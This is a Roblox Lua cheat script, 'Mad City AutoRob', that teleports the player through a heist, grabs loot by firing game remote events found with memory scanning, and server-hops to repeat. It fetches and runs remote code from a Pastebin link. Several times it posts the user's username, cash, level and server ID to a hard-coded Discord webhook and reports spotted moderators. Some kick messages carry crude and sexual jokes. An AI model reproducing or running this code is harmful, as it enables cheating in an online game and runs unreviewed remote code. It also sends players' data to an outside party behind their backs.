getgenv().timetoloadthepyramid = 5
getgenv().bagmaxsize = 10
getgenv().rdw = math.random(0, 0)
getgenv().nobug1 = 0.8
getgenv().nobug2 = 0.2
getgenv().waitbeforethegameisloaded = 4
getgenv().SomeJoiningWaitLol = 2
getgenv().SellTime = 4
getgenv().ShareAddictsInfoWithServer = false
getgenv().ShareModsInfoWithServer = false
getgenv().Method = "RejoinOnServerHop" -- ServerHop / CrashOnServerHop / RejoinOnServerHop

wait(getgenv().waitbeforethegameisloaded)
repeat wait() until game:GetService("ReplicatedStorage"):FindFirstChild("Remote")
task.wait(1.2)
repeat wait() until game:GetService("Players").LocalPlayer.Name ~= nil
task.wait(getgenv().SomeJoiningWaitLol)
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if not game.PlaceId == 1224212277 then
settings().Physics.PhysicsEnvironmentalThrottle = 1
task.wait(0.2)
local ohString1 = "RequestTeamChange"
local ohString2 = "Prisoners"

game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer(ohString1, ohString2)
wait(0.2)
local whitelist = {
    "arcadi90000",
    game.Players.LocalPlayer.Name

}
local id = {
    32945317,
    game.Players.LocalPlayer.UserId
}

local checked = false
for _, check in pairs(whitelist) do
    if checked == false then
if game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name) and game.Players.LocalPlayer.Name == check and game.Workspace[check].Name == check and game:GetService("Players").LocalPlayer.PlayerGui["All-LeaderboardV2"].MainFrame.ScrollingFrame:FindFirstChild("Player_" ..check) then
    for _, idcheck in pairs(id) do
        if game.Players.LocalPlayer.UserId == idcheck then
    checked = true
        end
end
end
end
end
loadstring(game:HttpGet("https://pastebin.com/raw/a4K7v3CA", true))()
local real = require(game.Players.LocalPlayer.PlayerScripts.Aero.Modules.HeistClient.Pyramid)
real.TeleportScreenEffect = nil
local v1 = require(game:GetService("Players").LocalPlayer.PlayerScripts.Aero.Controllers.Parachute)
v1.CanStart = false
for i, v in next, game.Players.LocalPlayer.Character:GetChildren() do
if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") then
    v:Destroy()
end
end

--ADDICTED PLAYERS DETECT START
getgenv().ShareAddictsInfoWithServer = true
local count = 0
local prestige = 2
for i, profiles in pairs(game:GetService("Players"):GetPlayers()) do
    if profiles:FindFirstChild("Level") and profiles.Level.Value ~= nil and profiles.Prestige.Value >= prestige then
        count = count + 1
    end
end
if count >= 4 then
    local url = "https://discord.com/api/webhooks/1059201914555863061/jkH5EG_274rivMdYhjxtetN7nPSLYblvwb_mxDLXXZB2NkX19viEb4mqWnmR9WcgkF4I"
local webhookcheck = syn and "Synapse X" or
   KRNL_LOADED and "Krnl" or
   "Idk exploit"

local data = {
   ["content"] = "**Mad City AutoRob (Dude its just for fun I just want to know who is using my script)**",
   ["embeds"] = {
       {
           ["title"] = "Your stats: ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name .."**\nPrestige: **" ..game:GetService("Players").LocalPlayer.Prestige.Value .."**\nCash: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.Cash.Container.Container.CashAmount.Text .."**\nlvl: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.Icon.RankLabel.Text .."**" .."\nXP left to rank up: ** "..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.XpAmount.Text.."** " .."Addicts detected. " .." Server ID: " ..game.JobId,
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
if getgenv().ShareAddictsInfoWithServer == true then
local url = "https://discord.com/api/webhooks/1059201914555863061/jkH5EG_274rivMdYhjxtetN7nPSLYblvwb_mxDLXXZB2NkX19viEb4mqWnmR9WcgkF4I"
local webhookcheck = syn and "Synapse X" or
   KRNL_LOADED and "Krnl" or
   "Idk exploit"

local data = {
   ["content"] = "**players finder**\nAddicts detected. " .." Server ID: " ..game.JobId .."",
   ["embeds"] = {
       {
           ["title"] = "",
           ["description"] = "Script to get into this server\n**game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, '" ..tostring(game.JobId) .."'," .." game:GetService'Players'.LocalPlayer)**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
end
wait(2)
end
--ADDICTED PLAYERS DETECT END

local Level_players_you_find_at_least = 500

for i, profiles in pairs(game:GetService("Players"):GetPlayers()) do
    if profiles:FindFirstChild("Level") and profiles.Level.Value ~= nil and profiles.Level.Value >= Level_players_you_find_at_least then
        local url = "https://discord.com/api/webhooks/1059201914555863061/jkH5EG_274rivMdYhjxtetN7nPSLYblvwb_mxDLXXZB2NkX19viEb4mqWnmR9WcgkF4I"
local webhookcheck = syn and "Synapse X" or
   KRNL_LOADED and "Krnl" or
   "Idk exploit"

local data = {
   ["content"] = "**Mad City AutoRob (Dude its just for fun I just want to know who is using my script)**",
   ["embeds"] = {
       {
           ["title"] = "Your stats: ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name .."**\nPrestige: **" ..game:GetService("Players").LocalPlayer.Prestige.Value .."**\nCash: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.Cash.Container.Container.CashAmount.Text .."**\nlvl: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.Icon.RankLabel.Text .."**" .."\nXP left to rank up: ** "..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.XpAmount.Text.."** " .."Mod detected. Name: " ..profiles.Name .." Server ID: " ..game.JobId .." 1",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
if getgenv().ShareModsInfoWithServer == true then
local url = "https://discord.com/api/webhooks/1059201914555863061/jkH5EG_274rivMdYhjxtetN7nPSLYblvwb_mxDLXXZB2NkX19viEb4mqWnmR9WcgkF4I"
local webhookcheck = syn and "Synapse X" or
   KRNL_LOADED and "Krnl" or
   "Idk exploit"

local data = {
   ["content"] = "**players finder**\nMods detected. " .." Server ID: " ..game.JobId .." Name: " ..profiles.Name,
   ["embeds"] = {
       {
           ["title"] = "",
           ["description"] = "Script to get into this server\n**game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, '" ..tostring(game.JobId) .."'," .." game:GetService'Players'.LocalPlayer)**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
        game:Shutdown()
task.wait(0.02)
    end
end
end
if checked == true then
local filter = {
--"player_interaction_eject",
--"player_interaction_arrest",
--"player_interaction_unarrest",
--"player_interaction_pickpocket",
"Treasure",
"Loot",
}
local rsentance = math.random(1, 18)
    local sentance;
    if rsentance == 1 then
        sentance = "this script is sponsored by the Nord vpn"
    elseif rsentance == 2 then
        sentance = "IShowSpeed more like IShowSkidddddddd"
    elseif rsentance == 3 then
        sentance = "Buy me only fans premium for $8.5 per month when v3 is out"
    elseif rsentance == 4 then
        sentance = "You either a smart fella or a fart smella?"
    elseif rsentance == 5 then
        sentance = "What color is your bagguette?"
    elseif rsentance == 6 then
        sentance = "Jingle balls, Jingle balls, Jingle all the way!"
    elseif rsentance == 7 then
        sentance = "Mad City script reporters get a life and dont touch the devs business. Its not your business!"
    elseif rsentance == 8 then
        sentance = "Capitalism is in a week! Wohoo! Im so happy about this information!"
    elseif rsentance == 9 then
        sentance = "I like when hairy sweaty men cover in oil"
    elseif rsentance == 10 then
        sentance = "I know where you live you live on earth haha Im going to tell it to other people"
    elseif rsentance == 11 then
        sentance = "Connection terminated. Im sorry to interrupt you Elizabeth, if you still even remember that name"
    elseif rsentance == 12 then
        sentance = "Cave Johnson: Schwifty Studios can eat my bankrupt |REDACTED|"
    elseif rsentance == 13 then
        sentance = "Im sorry..... But the poor devs need more money 😥. Please buy some gingerbread crates for them 🤮"
    elseif rsentance == 14 then
        sentance = "Fatty. No parents. Fatty Fatty."
    elseif rsentance == 15 then
        sentance = "Trr.. Skibidi dop dop dop dop yes yes yes yes trr skibidi dip skibidi double you double you double you double you yes yes yes yes"
    elseif rsentance == 16 then
        sentance = "Im announcing the new community vehicle update because our servers are not crashing yet because of amount of vehicle data is located on the server"
    elseif rsentance == 17 then
        sentance = "Obama have dick pum pubububububum pum pum pubububububum"
    elseif rsentance == 18 then
        sentance = "What is the last name of Obama?"
    end
print(sentance)
local localeplayer = game.Players.LocalPlayer.Character.HumanoidRootPart
local lastpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("All-RestrictedArea") then
game:GetService("Players").LocalPlayer.PlayerGui["All-RestrictedArea"]:Destroy()
end
localeplayer.Anchored = true
localeplayer.CFrame = game:GetService("ReplicatedStorage").Assets.Heists.Pyramid.Rooms.EnterTreasure.CFrame
task.wait(getgenv().timetoloadthepyramid)
for i = 1, 100000 do
    if not game:GetService("Workspace").Heists.Pyramid:FindFirstChild("Entrance") then
        task.wait()
    end
end
localeplayer.CFrame = CFrame.new(lastpos)
localeplayer.Anchored = false
if game:GetService("Workspace").Heists.Pyramid.Entrance.Transparency == 1 then
for _, f in pairs(filter) do
    
end
end
function somecodeforpyramidtp()
    if game:GetService("Players").LocalPlayer.PlayerGui.MainUI.Frames.SpawnTeams.Visible == true or game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.BackgroundFrame.Visible == true then
    if game:GetService("Workspace").Heists.Pyramid.Entrance.Transparency == 1 then
if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("PlayerNameplate") then
game.Players.LocalPlayer.Character.HumanoidRootPart.PlayerNameplate:Destroy()
end
    for i, v in pairs(game:GetService("Workspace").Heists.Pyramid:GetDescendants()) do
if v.Name == "teleporter effect middle" then
    localeplayer.CFrame = v.CFrame
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
end
end
else
    game.Players.LocalPlayer:Kick("Mad City AutoRob script made by BlueLobster#2505 https://discord.gg/mY3mwNpWvg " ..sentance)
    local goofyahhint = math.random(16, 26)
local Player = game.Players.LocalPlayer    
local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place,_id = game.PlaceId, game.JobId
local _servers = Api.._place.."/servers/Public?sortOrder=Desc&limit=100"
function ListServers(cursor)
   local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
   return Http:JSONDecode(Raw)
end

local Next; repeat
task.wait(0.2)
   local Servers = ListServers(Next)
   for i,v in next, Servers.data do
       if tonumber(v.playing) < goofyahhint and v.id ~= _id then
           local s,r = pcall(TPS.TeleportToPlaceInstance,TPS,_place,v.id,Player)
           if s then break end
       end
   end
   
   Next = Servers.nextPageCursor
until not Next
task.wait(0.2)
end
end
end

for _, f in pairs(filter) do
for i, v in pairs(getgc(true)) do
   if type(v) == "table" then
       if rawget(v, 'ID') and rawget(v, "Name") and v.Name == f and rawget(v, "OriginObject", "Body") then
           if tonumber(game:GetService("Players").LocalPlayer.PlayerGui["All-InBackpackDisplayHolder"].MainHolder.Numerator.Text) ~= getgenv().bagmaxsize then
               if game:GetService("Players").LocalPlayer.PlayerGui.MainUI.Frames.SpawnTeams.Visible == true or game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.BackgroundFrame.Visible == true then
           if v.Position ~= nil then
               somecodeforpyramidtp()
               wait(getgenv().nobug1)
               localeplayer.CFrame = localeplayer.CFrame * CFrame.new(0, 12343124332435, 0)
               wait(0.6)
           end
           print(v.ID, v.Name)
           print(v.Position)
           if v.Position ~= nil then
           localeplayer.CFrame = CFrame.new(v.Position) * CFrame.new(0, 10, 0)
           wait(0.4)
           if (v.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 20 then
for i, v in next, getgc(true) do
    if type(v) == "table" and rawget(v, "Name") and rawget(v, "ID") then
local ohTable1 = {
    [utf8.char(0)] = {
        [1] = "InteractBegin",
        [2] = v.ID
    }
}
local ohTable2 = {}

game:GetService("ReplicatedStorage").RedEvent:FireServer(ohTable1, ohTable2)
local ohTable1 = {
    [utf8.char(0)] = {
        [1] = "InteractRun",
        [2] = v.ID
    }
}
local ohTable2 = {}

game:GetService("ReplicatedStorage").RedEvent:FireServer(ohTable1, ohTable2)
task.wait()
end
end
	end
           task.wait(0.08)
           end
       end
   end
end
end
end
end
local u11 = require(game:GetService("ReplicatedStorage").Aero.Shared.Util)
wait(0.5)
if game:GetService("Players").LocalPlayer.PlayerGui.MainUI.Frames.SpawnTeams.Visible == true or game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.BackgroundFrame.Visible == true then
somecodeforpyramidtp()
local Level_players_you_find_at_least = 500

for i, profiles in pairs(game:GetService("Players"):GetPlayers()) do
    if profiles:FindFirstChild("Level") and profiles.Level.Value ~= nil and profiles.Level.Value >= Level_players_you_find_at_least then
        local url = "https://discord.com/api/webhooks/1059201914555863061/jkH5EG_274rivMdYhjxtetN7nPSLYblvwb_mxDLXXZB2NkX19viEb4mqWnmR9WcgkF4I"
local webhookcheck = syn and "Synapse X" or
   KRNL_LOADED and "Krnl" or
   "Idk exploit"

local data = {
   ["content"] = "**Mad City AutoRob (Dude its just for fun I just want to know who is using my script)**",
   ["embeds"] = {
       {
           ["title"] = "Your stats: ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name .."**\nPrestige: **" ..game:GetService("Players").LocalPlayer.Prestige.Value .."**\nCash: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.Cash.Container.Container.CashAmount.Text .."**\nlvl: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.Icon.RankLabel.Text .."**" .."\nXP left to rank up: ** "..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.XpAmount.Text.."** " .."Mod detected. Name: " ..profiles.Name .." Server ID: " ..game.JobId .." 2",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
        game:Shutdown()
task.wait(0.02)
    end
end
    wait(0.8)
    localeplayer.CFrame = CFrame.new(108, 200, -172)
    wait(getgenv().rdw + 0.5)
    localeplayer.CFrame = CFrame.new(108, 12341234122345, -172)
    wait(1.2)
    localeplayer.CFrame = CFrame.new(108, 28, -172)
    wait(getgenv().SellTime)
    local url = "https://discord.com/api/webhooks/1059201914555863061/jkH5EG_274rivMdYhjxtetN7nPSLYblvwb_mxDLXXZB2NkX19viEb4mqWnmR9WcgkF4I"
local webhookcheck = syn and "Synapse X" or
   KRNL_LOADED and "Krnl" or
   "Idk exploit"

local data = {
   ["content"] = "**Mad City AutoRob (Dude its just for fun I just want to know who is using my script)**",
   ["embeds"] = {
       {
           ["title"] = "Your stats: ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name .."**\nPrestige: **" ..game:GetService("Players").LocalPlayer.Prestige.Value .."**\nCash: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.Cash.Container.Container.CashAmount.Text .."**\nlvl: **" ..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.Icon.RankLabel.Text .."**" .."\nXP left to rank up: ** "..game:GetService("Players").LocalPlayer.PlayerGui.MainUI.LeftMain.XP.Container.XpAmount.Text.."** ",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
    game.Players.LocalPlayer:Kick("Mad City AutoRob script made by BlueLobster#2505 https://discord.gg/mY3mwNpWvg " ..sentance)
    if getgenv().Method == "ServerHop" then
    local goofyahhint = math.random(8, 26)
local Player = game.Players.LocalPlayer    
local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place,_id = game.PlaceId, game.JobId
local _servers = Api.._place.."/servers/Public?sortOrder=Desc&limit=100"
function ListServers(cursor)
   local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
   return Http:JSONDecode(Raw)
end

local Next; repeat
task.wait(0.2)
   local Servers = ListServers(Next)
   for i,v in next, Servers.data do
       if tonumber(v.playing) < goofyahhint and v.id ~= _id then
           local s,r = pcall(TPS.TeleportToPlaceInstance,TPS,_place,v.id,Player)
           if s then break end
       end
   end
   
   Next = Servers.nextPageCursor
until not Next
task.wait(0.2)
end
elseif
    getgenv().Method == "CrashOnServerHop" then
        game:Shutdown()
    elseif getgenv().Method == "RejoinOnServerHop" then
        game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, game:GetService'Players'.LocalPlayer)
end
end
end
